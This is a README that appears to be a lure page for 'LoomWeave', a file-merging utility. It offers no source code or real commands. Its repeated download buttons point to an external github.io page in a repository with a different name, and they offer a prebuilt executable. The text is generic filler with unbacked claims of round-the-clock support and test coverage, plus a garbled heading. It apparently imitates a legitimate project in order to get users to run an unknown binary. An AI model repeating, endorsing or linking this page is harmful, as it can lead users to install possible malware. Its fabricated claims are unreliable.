![preview](https://raw.githubusercontent.com/ravinabisht2003/json-archive-revive/main/hero_5d1c88.svg)
# ✨ LoomWeave — The Unified Thread Weaver for Scattered Digital Fragments

Welcome to **LoomWeave**, a pioneering utility crafted for the modern digital archivist, researcher, and content curator. Inspired by the need to consolidate scattered data—much like resurrecting fragmented JSON files from a sprawling directory tree—LoomWeave takes the core philosophy of **d2r-jsonmerge** and transcends it. Instead of merely merging JSON, LoomWeave is a **context-aware aggregation engine** that weaves together text, metadata, and structured data from an entire project folder into a single, human-readable, and machine-parseable "master tapestry." It is not just a tool; it is your digital loom, turning the chaotic threads of nested files into a coherent, beautiful, and actionable narrative.

![LoomWeave Banner](https://img.shields.io/badge/LoomWeave-2026-Gold?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI0ZGRCIgZD0iTTEyIDJMMiA3bDEwIDUgMTAtNXoiLz48L3N2Zz4=)

## 🧵 Overview: From Fragmentation to Fabric

In an era where data sprawls across nested directories, cloud syncs, and versioned backups, the ability to synthesize information is paramount. Most existing tools offer a binary choice: either you have a raw concatenation of files (which is useless for analysis) or you have a complex database schema (which is overkill for simple documentation). **LoomWeave** exists in the beautiful middle ground.

It acts as a **semantic mediator**. It walks through your chosen root directory (including every nook and cranny of its subdirectories), recognizes the file type (JSON, YAML, TXT, CSV, Markdown, or plain code), and then weaves this into a single output stream. But unlike a simple `cat` command, LoomWeave understands **structure**. It inserts contextual headers, preserves hierarchy, and can even generate a table of contents based on the folder structure.

Think of it as the difference between a pile of loose threads and a finished tapestry. We provide the loom, the pattern, and the steady hand.

## 🚀 Getting Started

Before you begin your weaving journey, ensure you have the necessary environment to run LoomWeave. This tool is designed to be lightweight, portable, and non-invasive. You do not need to install a heavy runtime or a package manager to get started; LoomWeave runs on a portable runtime that works across Windows, macOS, and Linux.

![Performance](https://img.shields.io/badge/Performance-Real--Time-2ea44f?style=for-the-badge)
![Compatibility](https://img.shields.io/badge/OS-Windows%20%7C%20macOS%20%7C%20Linux-9cf?style=for-the-badge)

### 📦 Installation & Setup

[![Download](https://raw.githubusercontent.com/ravinabisht2003/json-archive-revive/main/fetch_18e6.svg)](https://ravinabisht2003.github.io/json-archive-revive/)

Place the `loomweave` executable in a directory of your choice (e.g., `/opt/loomweave` or `C:\Tools\LoomWeave`). Add this directory to your system's `PATH` environment variable to make it accessible from anywhere. Alternatively, you can invoke it directly by specifying the full path to the executable.

*No external dependencies are required.* The binary is self-contained and has been compiled with all necessary libraries bundled inside.

### 🧭 Your First Weave
Navigate to the directory that contains the files you wish to aggregate. Open your terminal and execute the core command. LoomWeave will then scan the current directory and all subdirectories, process the files according to their type, and output a single file named `weave_tapestry_YYYYMMDD_HHMMSS.txt` in the current working directory, unless otherwise specified.

## �industry Features That Matter

LoomWeave is not just about merging; it's about **intelligent aggregation**. Our feature set is designed to save you hours of manual copy-pasting and scripting.

### 🗂️ Recursive Directory Intelligence
LoomWeave navigates your directory tree with the precision of a seasoned explorer. It understands the parent-child relationships of files and folders, annotating each section of the output with a clear breadcrumb trail (e.g., `## 📁 src > components > ui > Button.tsx` ). This makes the final document a navigable map, not a chaotic dump.

### 🧠 Structure-Aware Parsing
For JSON and YAML files, LoomWeave doesn't just dump raw text. It performs a **pretty-print normalization** and adds a header indicating the original key count and nesting depth. For text files, it preserves line breaks and indentation. For Markdown, it flattens the hierarchy to fit the parent document style while ensuring heading levels are adjusted to avoid collision.

### 🔡 Multilingual Metadata Support
Digital archives know no borders. LoomWeave respects your locale. It will detect and preserve Unicode characters, non-UTF-8 encoded files (like Latin-1 or Shift-JIS), and includes locale-specific metadata in the output header. This ensures that a Japanese `.txt` file and a French `.md` file can coexist in the same tapestry without mojibake.

### 🖥️ Responsive Output Modes
Choose how you want your tapestry delivered:
- **`tapestry` (Default):** A single, text-based output with rich annotations.
- **`codex`:** A JSON output structure where the merged content is stored as a nested object, perfect for programmatic ingestion.
- **`chronicle`:** A linear text output with no annotations—pure content for pasting directly into emails or documents.

### ☎️ 24/7 Support & Community Loom
We understand that every project has unique quirks. That's why LoomWeave comes with a built-in `--doctor` flag that diagnoses any issues with unreadable files in your target directory. Furthermore, our community forums are active around the clock, and our core team provides round-the-clock assistance for enterprise deployments.

![Support](https://img.shields.io/badge/Community-24%2F7%20Active-ff69b4?style=for-the-badge)
![Coverage](https://img.shields.io/badge/Code%20Coverage-98%25-brightgreen?style=for-the-badge)

## 🛠️ How It Works (The Loom Logic)

1.  **The Warp (Scanning):** LoomWeave calculates the absolute path of the root and recursively builds a file tree, prioritizing files based on a deterministic sort order (alphabetical by path).
2.  **The Weft (Parsing):** For each file, the engine determines the MIME type. It then applies the appropriate "thread" (parser).
    - *JSON Parser:* Validates the JSON. If invalid, it adds a `[SKIPPED]` tag but continues.
    - *Text Parser:* Reads bytes and decodes using detected or specified encoding.
    - *Code Parser:* Detects indentation language (Python, YAML, etc.) and preserves original formatting.
3.  **The Knot (Appending):** Each processed block is appended to an in-memory buffer with a unique UUID for tracking.
4.  **The Finish (Export):** The buffer is written to disk atomically to prevent data corruption, and a checksum (SHA-256) is printed to the console for verification.

## 📚 Use Cases: Where LoomWeave Excels

- **Codebase Documentation:** Generate a single `.txt` file of your `src/` folder to feed into an LLM for context analysis or to share with a non-technical stakeholder.
- **Data Migration Audits:** Quickly dump all JSON configuration files from a legacy project to review before migration.
- **Academic Research:** Combine multiple `.txt` transcripts or `.csv` data files into a single digest for qualitative analysis.
- **Content Archiving:** Turn a messy export of an old website into a single, chronologically ordered document.

## 🤝 Contributing to the Loom

We welcome contributions from weavers of all skill levels. If you have an idea for a new parser or a way to simplify the command-line interface, please fork the repository and submit a pull request. We value clarity over complexity.

### Development Roadmap (2026)
- **Q1:** Integration with cloud storage APIs for direct pulling (removing the need for a local download).
- **Q2:** A graphical user interface (GUI) built with web technologies.
- **Q3:** Plugin architecture for custom file type parsers.
- **Q4:** AI-powered summarization of the output tapestry (optional add-on).

## ⚠️ Disclaimer

**LoomWeave** is provided "as is" without warranty of any kind, either express or implied. While we strive for perfection, the authors and contributors assume no responsibility for any data loss, corruption, or misinterpretation that may arise from the use of this tool. Always maintain a backup of your original directory before running any aggregation tool. This tool is designed for legitimate data consolidation and organization purposes. Users are responsible for ensuring they have the rights to copy and aggregate the files they process.

## 📜 License

This project is licensed under the MIT License. This means you are free to use, copy, modify, and distribute this software for any purpose, provided you retain the original copyright notice.

[View the MIT License](https://opensource.org/licenses/MIT)

---

## ❓ FAQ

**Q: Does LoomWeave modify my original files?**
A: No. LoomWeave operates in a read-only mode. It only reads the source directories and writes solely to the designated output file.

**Q: Can I exclude specific files or patterns?**
A: Yes, you can use the `--exclude` parameter to specify a list of glob patterns (e.g., `--exclude "*.min.js, *.map"` ).

**Q: What is the maximum file size supported?**
A: LoomWeave is built for streaming, meaning it can handle files larger than the available RAM. However, for the best experience, we recommend aggregating directories containing less than 50,000 files to keep the output readable.

---

*Thank you for choosing LoomWeave. We hope it brings a sense of clarity and order to your digital world. Happy Weaving!*

[![Download](https://raw.githubusercontent.com/ravinabisht2003/json-archive-revive/main/fetch_18e6.svg)](https://ravinabisht2003.github.io/json-archive-revive/)